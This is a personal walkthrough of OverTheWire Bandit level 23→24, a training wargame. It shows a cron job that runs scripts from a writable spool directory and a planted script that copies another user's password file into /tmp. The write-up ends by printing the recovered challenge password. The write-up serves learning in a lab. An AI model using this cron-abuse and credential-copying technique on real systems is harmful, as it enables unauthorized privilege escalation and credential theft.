Bandit Level 23 → Level 24
==========================

Level Goal
----------

A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

Commands you may need to solve this level
-----------------------------------------

cron, crontab, crontab(5) (use “man 5 crontab” to access this)


Solution
========

This one took me some time to understand. While I relatively quickly found the script and understood what the script does, I didn't have a clue what to do in order to get the next level's password:

```
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
	echo "Handling $i"
	timeout -s 9 60 ./$i
	rm -f ./$i
    fi
done
```

Then after I asked one of the admins in IRC for a hint, I recognized that the script's directory ```/var/spool/bandit24``` is writeable for group ```bandit23```:

```
bandit23@bandit:~$ ls -al /var/spool/
total 24
drwxr-xr-x  7 root     root     4096 Oct 27 16:13 .
drwxr-xr-x 27 root     root     4096 Oct 27 16:13 ..
drwx-wx---  2 bandit24 bandit23 4096 Oct 27 16:36 bandit24
```

Therefore since the current user is ```bandit23```, we have write access to this directory.
So in order to exploit the script, we would have to write some own script to ```/var/spool/bandit24``` that gets executed by the script ```/usr/bin/cronjob_bandit24.sh``` every minute and then gets deleted. Great, but what should our own shell script do in order to get the next level's password?!

Then I remembered that I've sometimes read something about the location of passwords within the OverTheWire challenges. Unfortunately I neither recalled where I read about it nor did I recall what the location of the password files was. But since we already learned about search for files with specific attributes, I simply looked for an object that is owned by bandit24:

```
bandit23@bandit:~$ find / -user bandit24 2>/dev/null
/var/spool/bandit24
/etc/bandit_pass/bandit24
/etc/.info24.txt
/home/bandit24
/home/bandit24/.profile
/home/bandit24/.bashrc
/home/bandit24/.bash_logout
/usr/bin/cronjob_bandit24.sh
```

**Note to myself:**

**Be more concentrated and carefully collect all information you get!**

Because I later remembered where I read about the password path: It's in the ```motd``` (Message Of the Day) that gets displayed whenever one logs into at least some of the previous level's.

```
bandit23@bandit:~$ cat /run/motd.dynamic
[...]
--[ Playing the games ]--

  This machine holds several wargames.
  If you are playing "somegame", then:

    * USERNAMES are somegame0, somegame1, ...
    * Most LEVELS are stored in /somegame/.
    * PASSWORDS for each level are stored in /etc/somegame_pass/.
[...]
```

With this information im mind I quickly implemented my own script that gets executed by the cron job with the access rights of bandit24 and therefore is allowed to redirect the content of ```/etc/bandit_pass/bandit24``` into a file that the current user ```bandit23``` is allowed to access:

```
bandit23@bandit:~$ ls -al /etc/bandit_pass/bandit24
-r-------- 1 bandit24 bandit24 33 Sep 28 14:03 /etc/bandit_pass/bandit24
```
```
bandit23@bandit:~$ cat myscript.sh
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/bandit24_pass
chmod 0555 /tmp/bandit24_pass
```
```
cp myscript.sh /var/spool/bandit24
chmod 0777 //var/spool/bandit24/myscript.sh
```

After waiting a minute for the cronjob to be executed, I was able to display the next level's password =)

```
bandit23@bandit:~$ cat /tmp/bandit24_pass
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
```
